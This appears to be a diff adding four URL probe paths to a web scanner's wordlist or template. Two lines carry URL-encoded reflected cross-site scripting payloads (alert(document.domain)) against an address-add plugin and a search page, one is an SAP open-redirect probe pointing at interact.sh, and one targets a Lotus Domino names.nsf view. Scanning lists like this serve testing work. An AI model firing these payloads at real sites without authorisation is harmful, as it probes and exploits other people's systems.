@@ -1,0 +1,4 @@
+/names.nsf/People?OpenView
+/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/sap/bc/BSp/sap/menu/fameset.htm?sap--essioncmd=close&sapexiturl=https%3a%2f%2finteract.sh
+/search.htm?searchstring2=&searchstring=%27%3E%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
